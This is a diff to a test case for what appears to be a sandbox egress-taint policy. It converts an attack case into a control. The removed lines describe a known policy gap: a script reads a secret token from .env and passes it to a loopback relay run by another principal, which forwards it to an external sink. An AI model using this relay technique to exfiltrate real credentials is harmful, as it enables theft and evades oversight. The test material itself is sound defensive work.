@@ -1,17 +1,15 @@
-# KNOWN GAP: `recommended` forbids `external`/`unknown` peers but permits
-# `loopback`. Shell 1 (a different, untainted principal) runs a relay that
-# listens on 127.0.0.1 and forwards to the external sink. Shell 0 reads the
-# secret and sends it to the loopback relay -- an allowed loopback peer -- and
-# the relay, never having read a secret, carries it out. Registered in
-# known-gaps.toml.
-name = "proxy-via-loopback"
-kind = "attack"
+# A control for local-socket taint: the same loopback relay as
+# `proxy-via-loopback`, run by another principal, but the sender never read a
+# secret. An untainted contact hands nothing on, so the relay's forward is
+# ordinary egress and the canary must be delivered.
+name = "control-relay-untainted"
+kind = "control"
 policy = "recommended"
 # No shared `principal`: the relay is a separate principal from the reader.
 
 [[files]]
-path = ".env"
-contents = "TOKEN={CANARY}\n"
+path = "data.txt"
+contents = "payload={CANARY}\n"
 
 [[files]]
 path = "relay.py"
@@ -19,7 +17,7 @@ contents = """
 import socket
 srv = socket.socket()
 srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-srv.bind(("127.0.0.1", 18080))
+srv.bind(("127.0.0.1", 18082))
 srv.listen(1)
 conn, _ = srv.accept()
 data = conn.recv(65536)
@@ -32,11 +30,11 @@ out.sendall(data)
 path = "send.py"
 contents = """
 import socket, time
-secret = open(".env", "rb").read()
+data = open("data.txt", "rb").read()
 time.sleep(0.5)
 s = socket.socket()
-s.connect(("127.0.0.1", 18080))
-s.sendall(secret)
+s.connect(("127.0.0.1", 18082))
+s.sendall(data)
 """
 
 [[steps]]
